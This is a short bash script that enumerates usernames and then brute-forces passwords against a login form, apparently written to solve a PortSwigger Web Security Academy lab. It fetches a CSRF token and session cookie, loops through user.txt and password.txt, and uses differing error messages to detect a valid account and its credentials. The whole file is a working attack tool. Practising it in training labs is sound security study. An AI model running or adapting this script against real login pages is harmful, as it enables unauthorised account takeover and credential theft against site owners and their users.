#!/bin/bash

URL='https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do

	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	if echo $RESULT | grep -o "Invalid username" > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done

for PASS in `cat password.txt`;do

        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s`

        if echo $RESULT | grep -o "Incorrect password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
done
